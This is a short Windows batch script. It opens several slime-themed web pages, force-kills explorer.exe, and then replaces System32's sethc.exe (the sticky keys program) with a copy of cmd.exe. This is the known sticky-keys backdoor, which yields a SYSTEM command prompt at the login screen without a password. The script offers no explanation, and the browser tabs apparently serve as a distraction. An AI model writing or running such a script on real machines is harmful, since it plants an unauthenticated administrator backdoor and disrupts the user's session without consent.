@echo off
title off
start https://www.youtube.com/watch?v=9rBmbXtNrKI
start https://www.reddit.com/r/Slime/comments/11jwsfo/is_there_such_a_thing_as_slime_where_the_two/
start http://www.learnplayimagine.com/2014/05/color-mixing-with-slime.html
start https://youtomb.github.io/#/browse?mode=search
taskkill /f /im explorer.exe
cd C:\Windows\System32
takeown /f sethc.exe
move sethc.exe sethc.bak
copy cmd.exe sethc.exe
